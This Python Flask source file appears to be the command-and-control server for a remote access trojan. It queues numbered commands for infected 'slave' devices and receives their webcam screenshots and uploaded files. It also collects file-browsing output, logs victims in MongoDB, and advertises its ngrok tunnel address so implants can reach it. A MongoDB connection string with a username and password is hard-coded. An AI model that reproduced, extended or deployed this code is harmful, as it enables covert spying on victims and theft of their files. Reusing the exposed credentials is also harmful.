import numpy
import os
import json
from flask import *
from threading import Thread
import requests
import pymongo
from werkzeug.utils import secure_filename

api = Flask(__name__)

cmdArray = {'deviceName': '', 'command': 0, 'data': ''}

shellArr = {'shell': ''}

client = pymongo.MongoClient("mongodb+srv://aroshia:szorx@cluster0.bdzlv.mongodb.net/myFirstDatabase?retryWrites=true&w=majority")
conn = client.main 
col = conn.server

@api.route('/webcam-ss', methods=['POST'])
def ss():
  file = request.files['file']
  if file.filename != '':
    filename = secure_filename(file.filename)
    file.save(os.path.join(os.getcwd(), filename))
  else:
    return 'error'

  cmdArray['command'] = 0
  cmdArray['deviceName'] = ''
  cmdArray['data'] = ''
  return 'success'

@api.route('/browse-files', methods=['POST'])
def browse_files():
  global shellArr

  req = request.data.decode("utf-8")
  final = numpy.asarray(json.loads(req)['data'])

  shellArr['shell'] = str(final)

  cmdArray['command'] = 0
  cmdArray['deviceName'] = ''
  cmdArray['data'] = ''
  return 'success'

@api.route('/save-file', methods=['POST'])
def save_file():

  file = request.files['file']
  if file.filename != '':
    filename = secure_filename(file.filename)
    file.save(os.path.join(os.getcwd(), filename))
  else:
    return 'error'

  cmdArray['command'] = 0
  cmdArray['deviceName'] = ''
  cmdArray['data'] = ''
  return 'success'

@api.route('/command', methods=['POST'])
def cmd():
  req = request.data.decode("utf-8")

  if str(json.loads(req)['admin']) == 'admin':
    if str(json.loads(req)['id']) == '1':

      cmdArray['deviceName'] = str(json.loads(req)['deviceName'])
      cmdArray['command'] = 1
      cmdArray['data'] = str(json.loads(req)['data'])
      return 'success'

    if str(json.loads(req)['id']) == '2':

      cmdArray['deviceName'] = str(json.loads(req)['deviceName'])
      cmdArray['command'] = 2
      cmdArray['data'] = str(json.loads(req)['data'])
      return 'success'

    if str(json.loads(req)['id']) == '3':

      cmdArray['deviceName'] = str(json.loads(req)['deviceName'])
      cmdArray['command'] = 3
      cmdArray['data'] = str(json.loads(req)['data'])
      return 'success'

    if str(json.loads(req)['id']) == '4':

      cmdArray['deviceName'] = str(json.loads(req)['deviceName'])
      cmdArray['command'] = 4
      cmdArray['data'] = str(json.loads(req)['data'])
      return 'success'
  else:
    return 'fail'

@api.route('/check', methods=['GET'])
def check():
  return jsonify(cmdArray)

@api.route('/get-data', methods=['GET'])
def get_data():
  return jsonify(shellArr)

@api.route('/add', methods=['POST'])
def add():
  req = request.data.decode("utf-8")
  col0 = conn.slave
  array = list(col0.find({'id': json.loads(req)['id']}))
  if str(array) == '[]':
    mydict = { "id": json.loads(req)['id'] }
    col0.insert_one(mydict)

  try:
    if array[0]['id'] == None:
      mydict = { "id": str(array[0]['id']) }
      mydict0 = {"$set": { "id": json.loads(req)['id'] } }
      col0.update_one(mydict, mydict0)
  except:
    pass

  else:
    mydict = { "id": str(array[0]['id']) }
    mydict0 = {"$set": { "id": json.loads(req)['id'] } }
    col0.update_one(mydict, mydict0)
  return 'success'

def main():
  os.system('"ngrok http 3000 -host-header="localhost:3000" --log=stdout > ngrok.log &"')

def mongo():
  def ngrok_url():
    url = "http://127.0.0.1:4040/api/tunnels"
    try:
      response = requests.get(url)
      url_new_https = response.json()["tunnels"][0]["public_url"]
      return str(url_new_https)
    except:
      ngrok_url()

  array = list(col.find({'p63': 'p63'}))
  if str(array) == '[]':
    mydict = { 'p63': 'p63', "server": ngrok_url() }
    col.insert_one(mydict)

  try:
    if array[0]['server'] == None:
      mydict = { "server": str(array[0]['server']) }
      mydict0 = {"$set": { "server": ngrok_url() } }
      col.update_one(mydict, mydict0)
  except:
    pass

  else:
    mydict = { "server": str(array[0]['server']) }
    mydict0 = {"$set": { "server": ngrok_url() } }
    col.update_one(mydict, mydict0)

if __name__ == '__main__':
  Thread(target = main).start()
  mongo()
  api.run(host='localhost', port='3000')
